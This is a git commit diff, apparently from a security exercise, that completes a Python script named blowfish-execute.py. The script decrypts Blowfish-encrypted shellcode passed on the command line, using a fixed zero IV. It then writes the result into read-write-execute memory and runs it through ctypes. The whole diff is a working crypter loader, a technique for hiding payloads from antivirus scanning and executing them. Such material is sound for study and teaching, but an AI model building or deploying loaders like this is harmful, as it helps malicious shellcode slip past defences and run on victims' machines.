051a02688f65853ad414493fe1a5cb8a291719ee
Gonçalo Ribeiro <darklaw13@yahoo.co.uk>
2019-08-17 16:48:11 +0100

    Finish writing script to execute shellcode

--- 7/blowfish-execute.py
+++ 7/blowfish-execute.py
@@ -1,13 +1,31 @@
 #!/usr/bin/env python3
 import sys
 import blowfish
-from os import urandom
+import mmap
+import ctypes
 
 key = bytes(sys.argv[1], 'utf-8')
-# shellcode = bytes.fromhex(sys.argv[2].replace('\\x', ''))
-
-enc = r"\x3\x89\xc1\xa0\xbf\xb6\xdb\x63\xa8\xa2\xb3\x21\x18\xe\x2e\x42\xdc\x7a\x58\x12\x13\xe5\xb3\x7e\xed\x33"
+enc_shellcode = bytes.fromhex(sys.argv[2].replace('\\x', ''))
 
 iv = b'\x00\x00\x00\x00\x00\x00\x00\x00' #urandom(8)
 cipher = blowfish.Cipher(key)
-blocks = cipher.decrypt_cfb(enc, iv)
+blocks = cipher.decrypt_cfb(enc_shellcode, iv)
+
+shellcode = []
+for block in blocks:
+    for byte in block:
+        shellcode.append(byte)
+
+shellcode_bytes = bytes(shellcode)
+
+# execute shellcode
+exec_mem = mmap.mmap(-1, len(shellcode_bytes), prot = mmap.PROT_READ |
+        mmap.PROT_WRITE | mmap.PROT_EXEC, flags = mmap.MAP_ANONYMOUS |
+        mmap.MAP_PRIVATE)
+exec_mem.write(shellcode_bytes)
+
+ctypes_buffer = ctypes.c_int.from_buffer(exec_mem)
+func = ctypes.CFUNCTYPE(ctypes.c_int64)(ctypes.addressof(ctypes_buffer))
+func._avoid_gc_for_mmap = exec_mem
+
+func()
